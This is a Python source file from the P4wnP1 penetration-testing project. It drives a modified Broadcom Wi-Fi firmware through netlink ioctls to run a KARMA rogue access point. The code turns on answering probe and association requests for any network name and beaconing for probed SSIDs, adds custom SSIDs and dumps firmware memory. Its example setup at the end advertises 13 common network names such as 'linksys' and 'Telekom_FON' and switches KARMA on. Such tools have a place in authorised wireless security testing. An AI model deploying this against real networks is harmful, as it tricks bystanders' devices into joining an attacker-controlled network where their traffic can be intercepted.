#!/usr/bin/python

#    This file is part of P4wnP1.
#
#    Copyright (c) 2017, Marcus Mengs. 
#
#    P4wnP1 is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    P4wnP1 is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.


# The python classes are used to configure the MaMe82 nexmon firmware mod
# while an access point is up and running

import fcntl
import socket
import os
from ctypes import *
import struct

class struct_mame82_config(Structure):
	_fields_ = [("karma_probes", c_bool),
				("karma_assocs", c_bool),
				("karma_beacons", c_bool),
				("custom_beacons", c_bool),
				("debug_out", c_bool),
				("ssids_custom", c_void_p),
				("ssids_karma", c_void_p),
				("karma_beacon_autoremove", c_uint),
				("custom_beacon_autoremove", c_uint),
				("max_karma_beacon_ssids", c_ubyte),
				("max_custom_beacon_ssids", c_ubyte)]

class struct_nlmsghdr(Structure):
	_fields_ = [("nlmsg_len", c_uint),
				("nlmsg_type", c_ushort),
				("nlmsg_flags", c_ushort),
				("nlmsg_seq", c_uint),
				("nlmsg_pid", c_uint)]
	

class struct_IOCTL(Structure):
	_fields_ = [("cmd", c_uint),
				("buf", c_void_p),
				("len", c_uint),
				("set", c_bool),
				("used", c_uint),
				("needed", c_uint),
				("driver", c_uint)]
				
class struct_IFREQ(Structure):
	_fields_ = [("ifr_name", c_char*16),
				("ifr_data", c_void_p)]


class struct_nexudp_hdr(Structure):
	_fields_ = [("nex", c_char * 3),
				("type", c_char),
				("securitycookie", c_int)]
	

class struct_nexudp_ioctl_hdr(Structure):
	_fields_ = [("nexudphdr", struct_nexudp_hdr),
				("cmd", c_uint),
				("set", c_uint),
				("payload", c_byte * 1)]


class nexconf:
	NLMSG_ALIGNTO = 4
	RTMGRP_LINK = 1
#		IFLA_IFNAME = 3
#		NLM_F_REQUEST    = 0x0001
#		NLM_F_ROOT       = 0x0100
#		NLMSG_NOOP       = 0x0001
#		NLMSG_ERROR      = 0x0002
#		NLMSG_DONE       = 0x0003

	NEXUDP_IOCTL = 0
	NETLINK_USER = 31
	
	@staticmethod
	def create_cmd_ioctl(cmd, buf, set_val=False):
		ioctl = struct_IOCTL()
		ioctl.cmd = cmd
		ioctl.buf = cast(c_char_p(buf), c_void_p)
		ioctl.len = len(buf)
		ioctl.set = set_val
		ioctl.driver = 0x14e46c77
		return ioctl
		
	@staticmethod
	def create_ifreq(ifr_name, ifr_data):
		ifr = struct_IFREQ()
		ifr.ifr_name = struct.pack("16s", ifr_name) # padded with zeroes (maybe utf-8 conversion should be assured ?!?!)
		ifr.ifr_data = cast(pointer(ifr_data), c_void_p)
		return ifr 

	@staticmethod
	def c_struct2str(c_struct):
		return string_at(addressof(c_struct), sizeof(c_struct))
		
	@staticmethod
	def ptr2str(ptr, length):
		return string_at(ptr, length)
		
	@staticmethod
	def ctype2pystr(ct):
		return buffer(ct)[:]
		
	@staticmethod
	def print_struct(struct, pre=""):
		for field_name, field_type in struct._fields_:
				print pre,	field_name, field_type, getattr(struct, field_name)

	@staticmethod
	def NLMSG_ALIGN(length):
		return ((length + nexconf.NLMSG_ALIGNTO-1) & ~(nexconf.NLMSG_ALIGNTO - 1))

	@staticmethod
	def NLMSG_HDRLEN():
		return nexconf.NLMSG_ALIGN(sizeof(struct_nlmsghdr))

	@staticmethod
	def NLMSG_LENGTH(length):
		return length + nexconf.NLMSG_ALIGN(nexconf.NLMSG_HDRLEN())

	@staticmethod
	def NLMSG_SPACE(length):
		return nexconf.NLMSG_ALIGN(nexconf.NLMSG_LENGTH(length))

	@staticmethod
	def NLMSG_DATA(nlh):
		c = cast(nlh, c_void_p)
		c.value += nexconf.NLMSG_LENGTH(0) # inc is only possible for void ptr, we don't need to cast to char first as incrementation is done in single bytes (by adding to value)
		return c
	
	@staticmethod	
	def sendNL_IOCTL(ioc, debug=False):
		### NETLINK test ####
		
		if debug:
			print "Sending NL IOCTL\n\tcmd: {0}\n\tset_enabled: {1}\n\tpayload: {2}".format(ioc.cmd, ioc.set, repr(nexconf.ptr2str(ioc.buf, ioc.len)))
		



		frame_len = ioc.len + sizeof(struct_nexudp_ioctl_hdr) - sizeof(c_char)
		frame = struct_nexudp_ioctl_hdr()

		nlhbuf = create_string_buffer(nexconf.NLMSG_SPACE(frame_len))
		nlh = cast(pointer(nlhbuf), POINTER(struct_nlmsghdr))

		nlh.contents.nlmsg_len = nexconf.NLMSG_SPACE(frame_len)
		nlh.contents.nlmsg_pid = os.getpid();
		nlh.contents.nlmsg_flags = 0;


		pdata = nexconf.NLMSG_DATA(nlh)
		frame = cast(pdata, POINTER(struct_nexudp_ioctl_hdr))
		frame.contents.nexudphdr.nex = 'NEX'
		frame.contents.nexudphdr.type = chr(nexconf.NEXUDP_IOCTL)
		frame.contents.nexudphdr.securitycookie = 0;

		frame.contents.cmd = ioc.cmd
		frame.contents.set = ioc.set
		#frame.contents.payload = nexconf.ptr2str(ioc.buf, ioc.len)
		memmove(addressof(frame.contents.payload), ioc.buf, ioc.len)



		# frame to string
		fstr = nexconf.ptr2str(frame, nexconf.NLMSG_SPACE(frame_len) - nexconf.NLMSG_LENGTH(0))

		#full buf to string (including nlhdr)
		p_nlhbuf = pointer(nlhbuf)
		bstr = nexconf.ptr2str(p_nlhbuf, nexconf.NLMSG_SPACE(frame_len))


		'''
		print "NL HEADER"
		print type(p_nlhbuf)
		print repr(bstr)
		print repr(buffer(p_nlhbuf.contents)[:])
		print "NL MESSAGE DATA"
		print type(frame)
		print repr(fstr)
		print repr(buffer(frame.contents)[:])
		'''

		

		s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, nexconf.NETLINK_USER)

		# bind to kernel
		s.bind((os.getpid(), 0))
		sfd = os.fdopen(s.fileno(), 'w+b')


		sfd.write(bstr)
		sfd.flush()
		
		ret = ""
		if (ioc.set == 0):
			# read back result (CAUTION THERE'S NO SOCKET TIMEOUT IN USE, SO THIS COULD STALL)
			print "Reading back NETLINK answer ..."
			res_frame = sfd.read(nlh.contents.nlmsg_len)
			res_frame_len = len(res_frame)
		
			# pointer to result buffer
			p_res_frame = cast(c_char_p(res_frame), c_void_p)
			
			# point struct nlmsghdr to p_res_frame
			p_nlh = cast(p_res_frame, POINTER(struct_nlmsghdr))
		
			# grab pointer to data part of nlmsg
			p_nld_void = nexconf.NLMSG_DATA(p_nlh)
		
			# convert to: struct nexudp_ioctl_hdr*
			p_nld = cast(p_nld_void, POINTER(struct_nexudp_ioctl_hdr))
			
			# calculate offset to payload from p_res_frame
			offset_payload = addressof(p_nld.contents.payload) - p_res_frame.value
			
			payload = res_frame[offset_payload:]
			
			if debug:
				nexconf.print_struct(p_nlh.contents, "\t")
				nexconf.print_struct(p_nld.contents, "\t")
				nexconf.print_struct(p_nld.contents.nexudphdr, "\t")
				print "\tpayload:\t" + repr(payload)
			
			
			#return only payload part of res frame
			ret = payload

		sfd.close()
		s.close()
		
		return ret

	@staticmethod
	def send_IOCTL(ioc, device_name = "wlan0"):
		# This code is untested, because our target (BCM43430a1) talks NETLINK
		# so on Pi0w sendNL_IOCTL should be used

		SIOCDEVPRIVATE = 0x89F0

		# create ioctl ifreq
		ifr = nexconf.create_ifreq(device_name, ioc)


		# debug out
		'''
		print repr(nexconf.c_struct2str(ifr))
		print len(nexconf.c_struct2str(ifr))
		print repr(string_at(ifr.ifr_data, sizeof(ioc)))
		'''

		# send ioctl to kernel via UDP socket
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		fcntl.ioctl(s.fileno(), SIOCDEVPRIVATE, ifr)
		s.close()		
		
class MaMe82_IO:
	CMD=666
	
	MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_PROBE = 1
	MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_ASSOC = 2
	MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA = 3
	MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_BEACON = 4
	MAME82_IOCTL_ARG_TYPE_SET_KARMA_BEACON_AUTO_REMOVE_COUNT = 5
	MAME82_IOCTL_ARG_TYPE_SET_CUSTOM_BEACON_AUTO_REMOVE_COUNT = 6
	MAME82_IOCTL_ARG_TYPE_ADD_CUSTOM_SSID = 7
	MAME82_IOCTL_ARG_TYPE_DEL_CUSTOM_SSID = 8
	MAME82_IOCTL_ARG_TYPE_CLEAR_CUSTOM_SSIDS = 9
	MAME82_IOCTL_ARG_TYPE_CLEAR_KARMA_SSIDS = 10
	MAME82_IOCTL_ARG_TYPE_SET_ENABLE_CUSTOM_BEACONS = 11
	
	MAME82_IOCTL_ARG_TYPE_GET_CONFIG = 100
	MAME82_IOCTL_ARG_TYPE_GET_MEM = 101

	@staticmethod
	def s2hex(s):
		return "".join(map("0x%2.2x ".__mod__, map(ord, s)))

	@staticmethod
	def add_custom_ssid(ssid):
		if len(ssid) > 32:
			print "SSID too long, 32 chars max"
			return
		ioctl_addssid = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("II{0}s".format(len(ssid)), MaMe82_IO.MAME82_IOCTL_ARG_TYPE_ADD_CUSTOM_SSID, len(ssid), ssid), True)
		nexconf.sendNL_IOCTL(ioctl_addssid)
	
	@staticmethod
	def set_enable_karma_probe(on=True):
		if on:
			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_PROBE, 1, 1), True)
		else:
			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_PROBE, 1, 0), True)
		nexconf.sendNL_IOCTL(ioctl)
	
	@staticmethod	
	def set_enable_karma_assoc(on=True):
		if on:
			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_ASSOC, 1, 1), True)
		else:
			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_ASSOC, 1, 0), True)
		nexconf.sendNL_IOCTL(ioctl)
		
	@staticmethod	
	def set_enable_karma_beaconing(on=True):
		if on:
			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_BEACON, 1, 1), True)
		else:
			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_BEACON, 1, 0), True)
		nexconf.sendNL_IOCTL(ioctl)

	@staticmethod	
	def set_enable_custom_beaconing(on=True):
		if on:
			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_CUSTOM_BEACONS, 1, 1), True)
		else:
			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_CUSTOM_BEACONS, 1, 0), True)
		nexconf.sendNL_IOCTL(ioctl)

		
	@staticmethod	
	def set_enable_karma(on=True):
		if on:
			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA, 1, 1), True)
		else:
			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA, 1, 0), True)
		nexconf.sendNL_IOCTL(ioctl)
		
	@staticmethod	
	def clear_custom_ssids():
		ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("II", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_CLEAR_CUSTOM_SSIDS, 0), True)
		nexconf.sendNL_IOCTL(ioctl)
		
	@staticmethod	
	def clear_karma_ssids():
		ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("II", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_CLEAR_KARMA_SSIDS, 0), True)
		nexconf.sendNL_IOCTL(ioctl)
		
	@staticmethod	
	def set_autoremove_custom_ssids(beacon_count):
		ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("III", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_CUSTOM_BEACON_AUTO_REMOVE_COUNT, 4, beacon_count), True)
		nexconf.sendNL_IOCTL(ioctl)
		
	@staticmethod	
	def set_autoremove_karma_ssids(beacon_count):
		ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("III", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_KARMA_BEACON_AUTO_REMOVE_COUNT, 4, beacon_count), True)
		nexconf.sendNL_IOCTL(ioctl)
		
	@staticmethod
	def dump_conf(print_res=True):
		ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("II40s", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_GET_CONFIG, 4, ""), False)
		res = nexconf.sendNL_IOCTL(ioctl)
		
		mame82_config = struct_mame82_config()
		memmove(addressof(mame82_config), res, min(len(res), sizeof(struct_mame82_config)))
		
		if print_res:
			print "KARMA PROBES - Answer probe requests for foreign SSIDs [{0}]".format("On" if mame82_config.karma_probes else "Off")
			print "KARMA ASSOCS - Answer association requests for foreign SSIDs [{0}]".format("On" if mame82_config.karma_assocs else "Off")
			print "KARMA SSIDs - Broadcast beacons for foreigin SSIDs after probe request [{0}]".format("On" if mame82_config.karma_beacons else "Off")
			print "CUSTOM SSIDs - Broadcast beacons for custom SSIDs (added by user) [{0}]".format("On" if mame82_config.custom_beacons else "Off")
			print "(unused for now) Print debug messages to BCM43430a1 internal console [{0}]".format("On" if mame82_config.debug_out else "Off")
			
			print "Stop sending more beacons for KARMA SSIDs if no association request is received after [{0}] beacons (0 send forever)".format(mame82_config.karma_beacon_autoremove)
			print "Stop sending more beacons for CUSTOM SSIDs if no association request is received after [{0}] beacons (0 send forever)".format(mame82_config.custom_beacon_autoremove)

			print "Maximum allowed KARMA SSIDs for beaconing (no influence on assocs / probes): [{0}]".format(mame82_config.max_karma_beacon_ssids)
			print "Maximum allowed CUSTOM SSIDs: [{0}]".format(mame82_config.max_custom_beacon_ssids)
			
		return mame82_config
		
	@staticmethod
	def dump_mem(dump_addr, dump_len):
		ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("III{0}s".format(dump_len - 8), MaMe82_IO.MAME82_IOCTL_ARG_TYPE_GET_MEM, 4, dump_addr, ""), False)
		res = nexconf.sendNL_IOCTL(ioctl)
		print MaMe82_IO.s2hex(res)
			
def ioctl_get_test():
	### Send ioctl comand via netlink: test of GET (cmd 262, value 'bsscfg:ssid' in a buffer large enough to receive the response) ######

	# test to read a IO var for bsscfg:ssid (resp buffer: 4 bytes for uint32 ssid_len, 32 bytes for max len SSID)
	# Note: 
	#		The payload buffer size for send and recv are te same (36 in this test case), although the payload sent
	#		has only 11 bytes ("bsscfg:ssid") which are used. This has no impact for parsing the request for SSID on
	#		driver/firmware end. This means: We are free to choose the response buffer size, by adjusting the request buffer size.
	#		In case of the SSID request, the buffer is only partially overwritten with the response (for SSID 'test' only the first 8 bytes).
	#		The rest of the buffer isn't cleared to 0x00, but the response is prepended with an uint32 length field, which could be used
	#		to scrape out the relevant part of the response string.
	#		As I haven't dived into the inner workings of NETLINK, I haven't tested for responses which don't fit in a single message,
	#		but it is likely that those responses are fragmented over multiple NL messages and the nlmsg_seq header field is used to
	#		distinguish them. Anyway, this code DOESN'T ACCOUNT FOR THIS AND DOESN'T RECEIVE FRAGMENTED RESPONSES. NOR DOES THIS CODE ACCOUNT
	#		FOR MAXIMUM MESSAGE SIZE WHEN IT COMES TO SENDING (USING BUFFER WHICH ARE TOO LARGE).
	#		So this is considered experimental, the correct tool to use is nexutil written by the creators of nexmon ;-)

	ioctl_readvar_ssid = nexconf.create_cmd_ioctl(262, struct.pack("36s", "bsscfg:ssid"), False)
	res = nexconf.sendNL_IOCTL(ioctl_readvar_ssid)

	# clamp result string
	res_len = struct.unpack("I", res[:4])[0]
	res_str = res[4:4+res_len]
	print res_str



# As soon as an AP is running with hostapd (and backed by the customized nexmon firmware)
# the IOCTL to set up karma could be received.
#
# The hardcoded example commands below bring up a KARMA hotspot (responds to every probe/association
# request which the STA wants to see), with 13 additional SSIDs and BEACONING enabled for probed SSIDs
# Additionally the autoremove feature is enabled, for SSIDs not receiving an assoc request in timely
# manner.
#
# Each of this commands could be use to interactively manipulate the firmware from a python console.
#
# Example to disable KARMA:
# --------------------------------
#	>>> from mame82_util import *
#	>>> MaMe82_IO.set_enable_karma(False)
#	Sending NL IOCTL
#		cmd: 666
#		set_enabled: True
#		payload: '\x03\x00\x00\x00\x01\x00\x00\x00\x00'
#
#
# Example to enable KARMA + Beaconing for SSIDs from probe requests:
# ------------------------------------------------------------------
#	>>> from mame82_util import *
#	>>> MaMe82_IO.set_enable_karma(True)
#	Sending NL IOCTL
#		cmd: 666
#		set_enabled: True
#		payload: '\x03\x00\x00\x00\x01\x00\x00\x00\x01'
#	>>> MaMe82_IO.set_enable_karma_beaconing(True)
#	Sending NL IOCTL
#		cmd: 666
#		set_enabled: True
#		payload: '\x04\x00\x00\x00\x01\x00\x00\x00\x01'
#
#


### Example configuration for MaMe82 KARMA nexmon firmware mod ###
MaMe82_IO.add_custom_ssid("linksys")
MaMe82_IO.add_custom_ssid("NETGEAR")
MaMe82_IO.add_custom_ssid("dlink")
MaMe82_IO.add_custom_ssid("AndroidAP")
MaMe82_IO.add_custom_ssid("default")
MaMe82_IO.add_custom_ssid("cablewifi")
MaMe82_IO.add_custom_ssid("asus")
MaMe82_IO.add_custom_ssid("Guest")
MaMe82_IO.add_custom_ssid("Telekom")
MaMe82_IO.add_custom_ssid("xerox")
MaMe82_IO.add_custom_ssid("tmobile")
MaMe82_IO.add_custom_ssid("Telekom_FON")
MaMe82_IO.add_custom_ssid("freifunk")

MaMe82_IO.set_enable_karma(True) # send probe responses and association responses for foreign SSIDs

MaMe82_IO.set_enable_karma_beaconing(False) # send beacons for SSIDs seen in probe requests (we better don't enable this by default)
MaMe82_IO.set_autoremove_karma_ssids(600) # remove SSIDs from karma beaconing, which didn't received an assoc request after 600 beacons (1 minute)

MaMe82_IO.set_enable_custom_beaconing(True) # send beacons for the custom SSIDs set with 'add_custom_ssid'
MaMe82_IO.set_autoremove_custom_ssids(1800) # remove custom  SSIDs from beaconing list, if they didn't received an assoc request after 1800 beacons (3 minute)

MaMe82_IO.dump_conf(print_res=True)
